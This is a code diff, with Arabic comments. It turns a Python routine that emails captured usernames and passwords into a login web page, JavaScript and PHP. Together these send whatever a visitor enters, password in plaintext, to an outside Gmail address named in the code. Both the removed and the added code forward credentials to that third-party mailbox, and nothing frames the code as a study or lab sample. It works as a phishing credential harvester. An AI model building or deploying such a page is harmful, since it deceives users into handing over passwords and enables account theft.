@@ -1,26 +1,54 @@
-import smtplib
-from email.mime.text import MIMEText
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صفحة تسجيل الدخول</title>
+</head>
+<body>
+    <h1>تسجيل الدخول</h1>
+    <form id="login-form">
+        <label for="username">اسم المستخدم:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">تسجيل الدخول</button>
+    </form>
 
-# ... باقي الكود الخاص بك ...
+    <script src="script.js"></script>
+</body>
+</html>
+const form = document.getElementById('login-form');
 
-def send_email(username, password):
-    # معلومات البريد الإلكتروني المرسل إليه
-    recipient = 'lucifer1976m@gmail.com'
-    subject = 'بيانات تسجيل دخول جديدة'
-    body = f"اسم المستخدم: {username}\nكلمة المرور (مشفرة): {hashed_password}"
+form.addEventListener('submit', (event) => {
+    event.preventDefault();
 
-    # معلومات البريد الإلكتروني المرسل منه (قم بتغييرها إلى حسابك)
-    sender_email = 'your_email@gmail.com'
-    sender_password = 'your_email_password'
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    message = MIMEText(body)
-    message['From'] = sender_email
-    message['To'] = recipient
-    message['Subject'] = subject
+    fetch('send_data.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+    })
+    .then(response => response.text())
+    .then(data => console.log(data));
+});
+<?php
+// استقبال البيانات من JavaScript
+$data = json_decode(file_get_contents('php://input'), true);
+$username = $data['username'];
+$password = $data['password'];
 
-    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-        smtp.login(sender_email, sender_password)
-        smtp.sendmail(sender_email, recipient, message.as_string())
+// إعدادات البريد الإلكتروني (قم بتغييرها إلى إعداداتك)
+$to = 'lucifer1976m@gmail.com';
+$subject = 'بيانات تسجيل دخول جديدة';
+$message = "اسم المستخدم: $username\nكلمة المرور: $password";
+$headers = 'From: your_email@example.com';
 
-# ... في مكان إرسال الرسالة إلى واتساب، استبدلها بالدالة التالية:
-send_email(username, hashed_password)
+// إرسال البريد الإلكتروني
+mail($to, $subject, $message, $headers);
+
+echo 'تم إرسال البيانات بنجاح';
